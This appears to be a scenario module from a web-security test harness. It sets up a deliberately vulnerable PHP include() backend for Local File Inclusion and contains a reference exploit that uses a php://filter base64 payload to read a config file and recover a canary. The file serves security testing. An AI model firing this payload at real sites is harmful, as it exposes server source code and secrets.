// WSTG-INPV-11.1 (4.7.11.1) — Local File Inclusion behaviour.
// Node front proxies a page-include request to a real PHP backend whose include()
// sink takes the user-controlled page name. The canary is written into a PHP
// config file, so plain inclusion executes it (no output); the attacker uses the
// php://filter wrapper to base64-exfiltrate the source.

import { Scenario } from './scenario.mjs'

const CONFIG_PATH = '/tmp/app-config.php' // must match backends/lfi.php
const B = 'classes/wstg-lfi-4.7.11.1/backends'

export const classDef = {
  wstgId: 'WSTG-INPV-11.1',
  class: 'Local File Inclusion',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  // Real PHP backend with the include() sink; canary injected into its env.
  backend: {
    spec({ scenario, manifest }) {
      return {
        cmd: 'php',
        args: ['-S', '127.0.0.1:9001', `${B}/lfi.php`],
        port: 9001,
        env: {
          PR_BACKEND_PORT: '9001',
          PR_PAGE_PARAM: scenario.pageParam,
          PR_CANARY: manifest.perDeployCanary,
        },
      }
    },
  },

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage }) {
    // No page selected → host page (with the config-path hint).
    if (reqUrl.searchParams.get(scenario.pageParam) == null) {
      return { status: 200, body: renderPage(hostPage(scenario)) }
    }
    // Proxy the include to the real PHP backend and render its output.
    const r = await helpers.proxyToBackend(req, reqUrl)
    return { status: 200, body: renderPage(`<section style="max-width:680px;margin:0 auto">${r.body}</section>`) }
  },

  // Reference exploit: php://filter base64-exfiltrate the PHP config source, then
  // decode to recover the canary.
  async fireExploit({ baseUrl, scenario }) {
    const payload = `php://filter/convert.base64-encode/resource=${CONFIG_PATH}`
    const url = `${baseUrl}${scenario.endpoint.path}?${encodeURIComponent(scenario.pageParam)}=${encodeURIComponent(payload)}`
    const r = await fetch(url, { redirect: 'manual' })
    const text = await r.text()
    // decode candidate base64 blobs and append (so the criterion sees the canary)
    const decoded = (text.match(/[A-Za-z0-9+/]{40,}={0,2}/g) || [])
      .map(s => { try { return Buffer.from(s, 'base64').toString('utf8') } catch { return '' } })
      .join('\n')
    return { status: r.status, body: text + '\n<!--decoded-->\n' + decoded }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function hostPage(scenario) {
  const link = (p, label) => `<a href="${scenario.endpoint.path}?${encodeURIComponent(scenario.pageParam)}=${p}">${label}</a>`
  return `<section style="max-width:680px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.intro)}</p>
  <nav style="display:flex;gap:14px;margin-bottom:12px">${link('home', 'Home')} · ${link('about', 'About')} · ${link('pricing', 'Pricing')}</nav>
  <p style="font-size:13px;color:#666">Pages are rendered dynamically via the <code>${escapeHtml(scenario.pageParam)}</code> parameter. Site configuration loads from the server-side PHP config at <code>${CONFIG_PATH}</code>.</p>
</section>`
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
